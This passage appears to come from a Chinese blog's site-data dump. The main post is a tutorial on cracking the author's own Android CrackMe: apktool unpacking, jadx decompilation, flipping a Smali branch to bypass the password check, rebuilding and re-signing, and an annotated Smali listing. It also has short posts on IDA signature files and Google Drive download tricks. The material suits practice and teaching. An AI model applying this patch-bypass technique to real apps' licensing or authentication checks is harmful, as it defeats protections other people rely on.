#将获得的String字符赋值给InputKey局部变量中\n    .local v3, &quot;InputKey&quot;:Ljava/lang/String;\n    const-string v4, &quot;&quot;\n\n    .line 27\n    .local v4, &quot;TmpFlag&quot;:Ljava/lang/String;\n\n    # 下面两句表示 int i = 0\n    const/4 v5, 0x0\n    .local v5, &quot;i&quot;:I\n\n    :goto_0\n    #获取到输入字符串的长度\n    invoke-virtual {v3}, Ljava/lang/String;-&gt;length()I\n    #将长度返回给v6寄存器保存\n    move-result v6\n\n    #如果v5&gt;=v6 就跳转\n    if-ge v5, v6, :cond_0\n\n    .line 29\n    new-instance v6, Ljava/lang/StringBuilder;\n\n    invoke-direct {v6}, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V\n\n    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v3, v5}, Ljava/lang/String;-&gt;charAt(I)C\n\n    move-result v7\n    #xor-int/lit8 v7, v7, 0xa    v7(前) = v7(后) ^  0xa\n    xor-int/lit8 v7, v7, 0xa\n\n    int-to-char v7, v7\n\n    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;-&gt;append(C)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v6}, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;\n\n    move-result-object v4\n\n    .line 27\n    #add-int/lit8 v5, v5, 0x1  v5(前) = v5(后) + 1\n    add-int/lit8 v5, v5, 0x1\n\n    goto :goto_0\n\n    .line 32\n    .end local v5    # &quot;i&quot;:I\n\n\n    :cond_0\n    #Sting v5 = &quot;lfkmqBoffe*}exfnw&quot;\n    const-string v5, &quot;lfkmqBoffe*}exfnw&quot;\n\n    #v4.equals(v5) 返回值是boolean\n    invoke-virtual {v4, v5}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z\n\n    move-result v5\n\n    #v5不等于0跳转\n    if-nez v5, :cond_1\n\n    .line 34\n    const-string v5, &quot;\\u606d\\u559c\\u6b63\\u786e\\uff01&quot;\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 35\n    const-string v5, &quot;Success!&quot;\n\n    invoke-virtual {v1, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    goto :goto_1\n\n    .line 39\n    :cond_1\n    const-string v5, &quot;\\u9519\\u8bef\\uff0c\\u8bf7\\u91cd\\u8bd5\\uff01&quot;\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 40\n    invoke-virtual {v1, v4}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 42\n    :goto_1\n    return-void\n.end method\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 1\n    .param p1, &quot;savedInstanceState&quot;    # Landroid/os/Bundle;\n\n    .line 15\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V\n\n    .line 16\n    #这里给到的是资源布局文件的编号，去找到这个值对应的资源文件就行\n    const v0, 0x7f0a001c\n    #setContentView(R.layout.activity_main);\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;setContentView(I)V\n\n    .line 17\n    return-void\n.end method\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<p>自己写的第一个Android CrakeMe 也是为了练手</p>\n<p>随意输入参数为错误，始入正确flag能打印<code>Success</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193723.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214193723.png\"></p>\n<p>配合使用上一篇的流程破解</p>\n<h2 id=\"解包\"><a href=\"#解包\" class=\"headerlink\" title=\"解包\"></a>解包</h2><p>使用<code>apktool</code>解包</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193422.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214193422.png\"></p>\n<p>拿到了Smali文件</p>\n<h2 id=\"反编译\"><a href=\"#反编译\" class=\"headerlink\" title=\"反编译\"></a>反编译</h2><p>这里使用<code>jadx</code>发编译</p>\n<p>知道了成功会打印<code>Success</code>,直接搜索关键字就好了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194137.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214194137.png\"></p>\n<p>双击进去后就可以看到关键的代码，可以使用引用查看函数调用情况</p>\n<p>这里看到的<code>JAVA</code>代码是<code>Smali</code>反编译得到的，所以中文都是使用的<code>Unicode</code>表示,这也表示以后搜索代码中的关键字需要转化为<code>Unicode</code>字符集去搜索</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194305.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214194305.png\"></p>\n<p>很简单的逻辑就是改跳转，把 <code>==</code>改为<code>!=</code>这类的相反的比较</p>\n<p>我们不能直接修改JAVA代码，要修改JVM虚拟机读的<code>Smali</code>语句</p>\n<p>这和你要破解windows程序，不能在IDA中直接改F5出来伪代码，要修改汇编一个道理</p>\n<p>我们要修改的代码位置如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200228.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214200228.png\"></p>\n<p>找到相应的文件，使用编辑器打开，直接修改Smali语句就好了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200613.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214200613.png\"></p>\n<p>这里将<code>if-eqz</code>修改为<code>if-nez</code></p>\n<p>然后保存退出</p>\n<h2 id=\"回编译APK\"><a href=\"#回编译APK\" class=\"headerlink\" title=\"回编译APK\"></a>回编译APK</h2><p>这里需要将修改后的文件重新编译为APK，才能安装</p>\n<p>使用命令</p>\n<p><code>apktool b [Folder_Paht]</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201012.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201012.png\"></p>\n<p>成功后会在<code>Folder_Paht/dist</code>下创建新的打包文件，但是现在不能安装，没有签名文件，需要给这个文件签一个制作者的<code>sign</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201139.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201139.png\"></p>\n<p>具体命令</p>\n<p><code>jarsigner -verbose -keystore key.keystore D:\\Tools\\ApkTools\\Hello\\dist\\Hello.apk key.keystore</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201718.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201718.png\"></p>\n<p>放入模拟器，无论输入什么都会输出Success(除了正确密码…)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201908.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201908.png\"></p>\n<p>以上就是通过修改Smali语句实现的暴力破解</p>\n<p>下面详细分析一下Smali语句</p>\n<p>源码，注意空格在反编译的Smali语句中也算一行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216101748.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216101748.png\"></p>\n<pre><code class=\"Smali\">.class public Lcom/Crat/changeme/MainActivity;#类名\n.super Landroidx/appcompat/app/AppCompatActivity;#父类\n.source &quot;MainActivity.java&quot;#对应的JAVA源代码文件名\n\n\n# direct methods\n.method public constructor &lt;init&gt;()V\n    .locals 0\n\n    .line 11\n    #调用父类的AppCompatActivity初始化函数，已经识别为init\n    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-&gt;&lt;init&gt;()V                    \n\n    #无返回值\n    return-void\n.end method\n\n\n# virtual methods\n.method public Pushed(Landroid/view/View;)V\n    .locals 8\n    .param p1, &quot;view&quot;    # Landroid/view/View;\n\n    .line 21\n    # v0 = 0x7f070042\n    const v0, 0x7f070042\n\n    #调用MainActivity.findViewById(int v0)  返回值是 View 类型\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    #将返回值(对象)赋给v0\n    move-result-object v0\n\n    #强制类型转换，将v0转换为TextView类型\n    check-cast v0, Landroid/widget/TextView;\n\n    .line 22\n    #声明变量 TextView Name  来保存v0寄存器的值\n    .local v0, &quot;Name&quot;:Landroid/widget/TextView;\n\n    const v1, 0x7f0700ab\n\n    invoke-virtual {p0, v1}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    move-result-object v1\n\n    check-cast v1, Landroid/widget/TextView;\n\n    .line 23\n    .local v1, &quot;Text2&quot;:Landroid/widget/TextView;\n    const v2, 0x7f070054\n\n    invoke-virtual {p0, v2}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    move-result-object v2\n\n    check-cast v2, Landroid/widget/TextView;\n\n    .line 24\n    .local v2, &quot;Edit2&quot;:Landroid/widget/TextView;\n    #下面一句翻译为java语句是 v2.getText() 函数返回类型为char类型的序列\n    #CharSequence和String 详情请看：https://blog.csdn.net/iblade/article/details/78111223\n    invoke-virtual {v2}, Landroid/widget/TextView;-&gt;getText()Ljava/lang/CharSequence;\n\n    move-result-object v3\n    #给上面的CharSequence转换为String类型\n    invoke-interface {v3}, Ljava/lang/CharSequence;-&gt;toString()Ljava/lang/String;\n\n    move-result-object v3\n\n    .line 25\n    #将获得的String字符赋值给InputKey局部变量中\n    .local v3, &quot;InputKey&quot;:Ljava/lang/String;\n    const-string v4, &quot;&quot;\n\n    .line 27\n    .local v4, &quot;TmpFlag&quot;:Ljava/lang/String;\n\n    # 下面两句表示 int i = 0\n    const/4 v5, 0x0\n    .local v5, &quot;i&quot;:I\n\n    :goto_0\n    #获取到输入字符串的长度\n    invoke-virtual {v3}, Ljava/lang/String;-&gt;length()I\n    #将长度返回给v6寄存器保存\n    move-result v6\n\n    #如果v5&gt;=v6 就跳转\n    if-ge v5, v6, :cond_0\n\n    .line 29\n    new-instance v6, Ljava/lang/StringBuilder;\n\n    invoke-direct {v6}, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V\n\n    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v3, v5}, Ljava/lang/String;-&gt;charAt(I)C\n\n    move-result v7\n    #xor-int/lit8 v7, v7, 0xa    v7(前) = v7(后) ^  0xa\n    xor-int/lit8 v7, v7, 0xa\n\n    int-to-char v7, v7\n\n    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;-&gt;append(C)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v6}, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;\n\n    move-result-object v4\n\n    .line 27\n    #add-int/lit8 v5, v5, 0x1  v5(前) = v5(后) + 1\n    add-int/lit8 v5, v5, 0x1\n\n    goto :goto_0\n\n    .line 32\n    .end local v5    # &quot;i&quot;:I\n\n\n    :cond_0\n    #Sting v5 = &quot;lfkmqBoffe*}exfnw&quot;\n    const-string v5, &quot;lfkmqBoffe*}exfnw&quot;\n\n    #v4.equals(v5) 返回值是boolean\n    invoke-virtual {v4, v5}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z\n\n    move-result v5\n\n    #v5不等于0跳转\n    if-nez v5, :cond_1\n\n    .line 34\n    const-string v5, &quot;\\u606d\\u559c\\u6b63\\u786e\\uff01&quot;\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 35\n    const-string v5, &quot;Success!&quot;\n\n    invoke-virtual {v1, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    goto :goto_1\n\n    .line 39\n    :cond_1\n    const-string v5, &quot;\\u9519\\u8bef\\uff0c\\u8bf7\\u91cd\\u8bd5\\uff01&quot;\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 40\n    invoke-virtual {v1, v4}, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V\n\n    .line 42\n    :goto_1\n    return-void\n.end method\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 1\n    .param p1, &quot;savedInstanceState&quot;    # Landroid/os/Bundle;\n\n    .line 15\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V\n\n    .line 16\n    #这里给到的是资源布局文件的编号，去找到这个值对应的资源文件就行\n    const v0, 0x7f0a001c\n    #setContentView(R.layout.activity_main);\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;setContentView(I)V\n\n    .line 17\n    return-void\n.end method\n</code></pre>\n"},{"title":"IDA制作签名","index_img":"https://w.wallhaven.cc/full/96/wallhaven-96z68x.jpg","banner_img":"https://w.wallhaven.cc/full/96/wallhaven-96z68x.jpg","date":"2019-08-18T11:11:22.000Z","_content":"\n\n我这里使用的是IDA6.8的制作签名包\n如果我们知道是什么语言 的，但是没有签名包，就自己做一个\n\n### 手工方式：\n\n\t1.pcf.exe source.lib XXXX.pcf\n\t2.sigmake.exe XXXX.pcf YYYY.sig\n\t这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出\n\t3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了\n\n然后把这个文件拷贝到IDA目录下的sig文件夹下面\n接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了\n\n### 脚本\n网上有脚本，但是运行不了，我小改了一下，效果还不错 \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190808133028934.gif)\n\n如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat \n用法：\n\t`lib2sig.bat vclibxxx.lib`\n直接生成一个sig文件\n\n\n链接: https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw 提取码: f2by \n\n\n","source":"_posts/IDA制作签名.md","raw":"---\ntitle: IDA制作签名\nindex_img: https://w.wallhaven.cc/full/96/wallhaven-96z68x.jpg\nbanner_img: https://w.wallhaven.cc/full/96/wallhaven-96z68x.jpg\ndate: 2019-08-18 19:11:22\ntags:\n    - IDA\ncategories: 逆向\n---\n\n\n我这里使用的是IDA6.8的制作签名包\n如果我们知道是什么语言 的，但是没有签名包，就自己做一个\n\n### 手工方式：\n\n\t1.pcf.exe source.lib XXXX.pcf\n\t2.sigmake.exe XXXX.pcf YYYY.sig\n\t这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出\n\t3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了\n\n然后把这个文件拷贝到IDA目录下的sig文件夹下面\n接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了\n\n### 脚本\n网上有脚本，但是运行不了，我小改了一下，效果还不错 \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190808133028934.gif)\n\n如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat \n用法：\n\t`lib2sig.bat vclibxxx.lib`\n直接生成一个sig文件\n\n\n链接: https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw 提取码: f2by \n\n\n","slug":"IDA制作签名","published":1,"updated":"2019-10-29T10:54:56.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw61e0004ccuqo5zr2q0d","content":"<p>我这里使用的是IDA6.8的制作签名包<br>如果我们知道是什么语言 的，但是没有签名包，就自己做一个</p>\n<h3 id=\"手工方式：\"><a href=\"#手工方式：\" class=\"headerlink\" title=\"手工方式：\"></a>手工方式：</h3><pre><code>1.pcf.exe source.lib XXXX.pcf\n2.sigmake.exe XXXX.pcf YYYY.sig\n这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出\n3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了</code></pre><p>然后把这个文件拷贝到IDA目录下的sig文件夹下面<br>接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了</p>\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>网上有脚本，但是运行不了，我小改了一下，效果还不错<br><img src=\"https://img-blog.csdnimg.cn/20190808133028934.gif\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat<br>用法：<br>    <code>lib2sig.bat vclibxxx.lib</code><br>直接生成一个sig文件</p>\n<p>链接: <a href=\"https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw</a> 提取码: f2by </p>\n","site":{"data":{}},"excerpt":"","more":"<p>我这里使用的是IDA6.8的制作签名包<br>如果我们知道是什么语言 的，但是没有签名包，就自己做一个</p>\n<h3 id=\"手工方式：\"><a href=\"#手工方式：\" class=\"headerlink\" title=\"手工方式：\"></a>手工方式：</h3><pre><code>1.pcf.exe source.lib XXXX.pcf\n2.sigmake.exe XXXX.pcf YYYY.sig\n这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出\n3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了</code></pre><p>然后把这个文件拷贝到IDA目录下的sig文件夹下面<br>接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了</p>\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>网上有脚本，但是运行不了，我小改了一下，效果还不错<br><img src=\"https://img-blog.csdnimg.cn/20190808133028934.gif\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat<br>用法：<br>    <code>lib2sig.bat vclibxxx.lib</code><br>直接生成一个sig文件</p>\n<p>链接: <a href=\"https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw</a> 提取码: f2by </p>\n"},{"title":"Google Driver 整合篇","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png","date":"2020-03-27T16:00:00.000Z","_content":"\n## 前提\n\n1.拥有一个Google Gmail账号\n\n2.有梯子\n\n## 加入团队盘\n\nGoogle Driver的本身容量很小，使用团队盘就可以无限大小\n\n这些团队盘大多都是各个大学背景申请的，具体操作未知\n\n申请地址（如果失效，自行Google【Google Team Drive 申请】）\n\nhttps://td.fastio.me/ \n\n**Name 随意填写**\n\n**邮箱就填你要的Gmail邮箱**\n\n![image-20200328103456093](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103456093.png)\n\n回到自己的Google Driver中，看到有共享云硬盘则为成功，否则多尝试加入几个Driver Team\n\n![image-20200328103655483](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103655483.png)\n\n## 资源\n\n资源一般都是在TG电报群中找，很多资源，这些看自己技术了\n\nhttps://t.me/dianying4k\n\nhttp://www.sssoou.com\n\n## 如何加速下载\n\n这个加速加载只能下载你自己的网盘里面的东西\n\n### GoIndex 代码生成\n\n访问 https://install.gd.workers.dev/\n\n1. 获取认证码，都是点点点，复制粘贴\n\n2. 目录可以默认\n\n3. 密码可以自己设置，但是要记住\n\n4. 点击生成代码，这个代码要部署到cloudflare中\n\n5. 这个时候点击 https://dash.cloudflare.com/\n\n   ![](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110246292.png)\n\n6. 自行注册，账号没有要求。登录后点击如下地址\n\n   ![image-20200328110413035](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110413035.png)\n\n7. 创建新的，贴上之前生成的js代码，然后修改root如下，然后保存部署\n\n   ![](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110948928.png)\n\n8. 访问右侧的链接，会叫填入密码，密码就是第3步设置的\n\n   ![image-20200328111301819](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328111301819.png)\n\n9. 复制它的链接，打开下载工具，迅雷，IDM，Motrix等都可以\n\n   我这里用Motrix测试，家里带宽50M\n\n   ![image-20200328113104155](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png)\n\n   去测一下https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。\n\n   ![image-20200328112645982](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328112645982.png)\n","source":"_posts/Google Driver整合篇.md","raw":"---\ntitle: Google Driver 整合篇\ntags: [下载]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png\ndate: 2020-3-28\n---\n\n## 前提\n\n1.拥有一个Google Gmail账号\n\n2.有梯子\n\n## 加入团队盘\n\nGoogle Driver的本身容量很小，使用团队盘就可以无限大小\n\n这些团队盘大多都是各个大学背景申请的，具体操作未知\n\n申请地址（如果失效，自行Google【Google Team Drive 申请】）\n\nhttps://td.fastio.me/ \n\n**Name 随意填写**\n\n**邮箱就填你要的Gmail邮箱**\n\n![image-20200328103456093](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103456093.png)\n\n回到自己的Google Driver中，看到有共享云硬盘则为成功，否则多尝试加入几个Driver Team\n\n![image-20200328103655483](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103655483.png)\n\n## 资源\n\n资源一般都是在TG电报群中找，很多资源，这些看自己技术了\n\nhttps://t.me/dianying4k\n\nhttp://www.sssoou.com\n\n## 如何加速下载\n\n这个加速加载只能下载你自己的网盘里面的东西\n\n### GoIndex 代码生成\n\n访问 https://install.gd.workers.dev/\n\n1. 获取认证码，都是点点点，复制粘贴\n\n2. 目录可以默认\n\n3. 密码可以自己设置，但是要记住\n\n4. 点击生成代码，这个代码要部署到cloudflare中\n\n5. 这个时候点击 https://dash.cloudflare.com/\n\n   ![](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110246292.png)\n\n6. 自行注册，账号没有要求。登录后点击如下地址\n\n   ![image-20200328110413035](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110413035.png)\n\n7. 创建新的，贴上之前生成的js代码，然后修改root如下，然后保存部署\n\n   ![](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110948928.png)\n\n8. 访问右侧的链接，会叫填入密码，密码就是第3步设置的\n\n   ![image-20200328111301819](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328111301819.png)\n\n9. 复制它的链接，打开下载工具，迅雷，IDM，Motrix等都可以\n\n   我这里用Motrix测试，家里带宽50M\n\n   ![image-20200328113104155](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png)\n\n   去测一下https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。\n\n   ![image-20200328112645982](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328112645982.png)\n","slug":"Google Driver整合篇","published":1,"updated":"2020-03-31T10:47:29.151Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw61j0005ccuqbu6f7it2","content":"<h2 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h2><p>1.拥有一个Google Gmail账号</p>\n<p>2.有梯子</p>\n<h2 id=\"加入团队盘\"><a href=\"#加入团队盘\" class=\"headerlink\" title=\"加入团队盘\"></a>加入团队盘</h2><p>Google Driver的本身容量很小，使用团队盘就可以无限大小</p>\n<p>这些团队盘大多都是各个大学背景申请的，具体操作未知</p>\n<p>申请地址（如果失效，自行Google【Google Team Drive 申请】）</p>\n<p><a href=\"https://td.fastio.me/\" target=\"_blank\" rel=\"noopener\">https://td.fastio.me/</a> </p>\n<p><strong>Name 随意填写</strong></p>\n<p><strong>邮箱就填你要的Gmail邮箱</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103456093.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328103456093\"></p>\n<p>回到自己的Google Driver中，看到有共享云硬盘则为成功，否则多尝试加入几个Driver Team</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103655483.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328103655483\"></p>\n<h2 id=\"资源\"><a href=\"#资源\" class=\"headerlink\" title=\"资源\"></a>资源</h2><p>资源一般都是在TG电报群中找，很多资源，这些看自己技术了</p>\n<p><a href=\"https://t.me/dianying4k\" target=\"_blank\" rel=\"noopener\">https://t.me/dianying4k</a></p>\n<p><a href=\"http://www.sssoou.com\" target=\"_blank\" rel=\"noopener\">http://www.sssoou.com</a></p>\n<h2 id=\"如何加速下载\"><a href=\"#如何加速下载\" class=\"headerlink\" title=\"如何加速下载\"></a>如何加速下载</h2><p>这个加速加载只能下载你自己的网盘里面的东西</p>\n<h3 id=\"GoIndex-代码生成\"><a href=\"#GoIndex-代码生成\" class=\"headerlink\" title=\"GoIndex 代码生成\"></a>GoIndex 代码生成</h3><p>访问 <a href=\"https://install.gd.workers.dev/\" target=\"_blank\" rel=\"noopener\">https://install.gd.workers.dev/</a></p>\n<ol>\n<li><p>获取认证码，都是点点点，复制粘贴</p>\n</li>\n<li><p>目录可以默认</p>\n</li>\n<li><p>密码可以自己设置，但是要记住</p>\n</li>\n<li><p>点击生成代码，这个代码要部署到cloudflare中</p>\n</li>\n<li><p>这个时候点击 <a href=\"https://dash.cloudflare.com/\" target=\"_blank\" rel=\"noopener\">https://dash.cloudflare.com/</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110246292.png\" srcset=\"/cray/img/loading.gif\" alt></p>\n</li>\n<li><p>自行注册，账号没有要求。登录后点击如下地址</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110413035.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328110413035\"></p>\n</li>\n<li><p>创建新的，贴上之前生成的js代码，然后修改root如下，然后保存部署</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110948928.png\" srcset=\"/cray/img/loading.gif\" alt></p>\n</li>\n<li><p>访问右侧的链接，会叫填入密码，密码就是第3步设置的</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328111301819.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328111301819\"></p>\n</li>\n<li><p>复制它的链接，打开下载工具，迅雷，IDM，Motrix等都可以</p>\n<p>我这里用Motrix测试，家里带宽50M</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328113104155\"></p>\n<p>去测一下<a href=\"https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。\" target=\"_blank\" rel=\"noopener\">https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328112645982.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328112645982\"></p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h2><p>1.拥有一个Google Gmail账号</p>\n<p>2.有梯子</p>\n<h2 id=\"加入团队盘\"><a href=\"#加入团队盘\" class=\"headerlink\" title=\"加入团队盘\"></a>加入团队盘</h2><p>Google Driver的本身容量很小，使用团队盘就可以无限大小</p>\n<p>这些团队盘大多都是各个大学背景申请的，具体操作未知</p>\n<p>申请地址（如果失效，自行Google【Google Team Drive 申请】）</p>\n<p><a href=\"https://td.fastio.me/\" target=\"_blank\" rel=\"noopener\">https://td.fastio.me/</a> </p>\n<p><strong>Name 随意填写</strong></p>\n<p><strong>邮箱就填你要的Gmail邮箱</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103456093.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328103456093\"></p>\n<p>回到自己的Google Driver中，看到有共享云硬盘则为成功，否则多尝试加入几个Driver Team</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328103655483.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328103655483\"></p>\n<h2 id=\"资源\"><a href=\"#资源\" class=\"headerlink\" title=\"资源\"></a>资源</h2><p>资源一般都是在TG电报群中找，很多资源，这些看自己技术了</p>\n<p><a href=\"https://t.me/dianying4k\" target=\"_blank\" rel=\"noopener\">https://t.me/dianying4k</a></p>\n<p><a href=\"http://www.sssoou.com\" target=\"_blank\" rel=\"noopener\">http://www.sssoou.com</a></p>\n<h2 id=\"如何加速下载\"><a href=\"#如何加速下载\" class=\"headerlink\" title=\"如何加速下载\"></a>如何加速下载</h2><p>这个加速加载只能下载你自己的网盘里面的东西</p>\n<h3 id=\"GoIndex-代码生成\"><a href=\"#GoIndex-代码生成\" class=\"headerlink\" title=\"GoIndex 